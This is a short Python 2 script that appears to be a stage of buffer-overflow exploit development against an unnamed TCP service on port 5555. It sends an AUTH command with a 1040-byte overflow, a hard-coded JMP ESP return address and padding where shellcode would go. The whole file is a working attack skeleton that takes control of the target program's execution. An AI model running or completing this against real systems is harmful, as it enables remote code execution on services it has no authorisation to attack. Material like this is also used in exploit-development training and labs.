#!/usr/bin/python
#
# FOUND JMP ESP AT: 65D11D71

import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

JMP_ESP = "\x71\x1D\xD1\x65"
string = "A"*1040 + JMP_ESP + "C"*(1400-1040-4)

req1 = "AUTH " + string
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
